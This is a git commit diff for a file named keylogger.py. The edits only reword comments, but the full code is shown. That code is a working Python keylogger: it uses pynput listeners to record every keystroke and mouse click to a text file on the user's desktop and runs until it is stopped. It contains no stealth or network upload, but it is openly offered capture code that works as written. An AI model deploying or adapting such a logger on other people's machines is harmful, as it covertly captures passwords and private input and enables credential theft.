d5f57b765603de6ff2d4d2ce0f1c9ef05fd2ad14
IcePopz <48578217+IcePopz-infosec@users.noreply.github.com>
2023-06-20 22:52:43 -0500

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,35 +1,35 @@
 import pynput.keyboard
 import pynput.mouse
 
-# Define the path to the log file
+# path to the log file
 log_file = "/Users/mymac/Desktop/log.txt"
 
 
-# Create a function to write the keystrokes to the log file
+# function to write the keystrokes to the log file
 def write_to_log(key):
     with open(log_file, "a") as file:
         file.write(str(key) + "\n")
 
 
-# Create a keyboard listener
+#  keyboard listener
 def on_press(key):
     write_to_log(key)
 
 
-# Create a mouse listener
+#  mouse listener
 def on_click(x, y, button, pressed):
     if pressed:
         write_to_log(button)
 
 
-# Start the keyboard listener
+# start the keyboard listener
 keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
 keyboard_listener.start()
 
-# Start the mouse listener
+# start the mouse listener
 mouse_listener = pynput.mouse.Listener(on_click=on_click)
 mouse_listener.start()
 
-# Keep the program running to continue monitoring
+# keep the program running to continue monitoring
 keyboard_listener.join()
 mouse_listener.join()
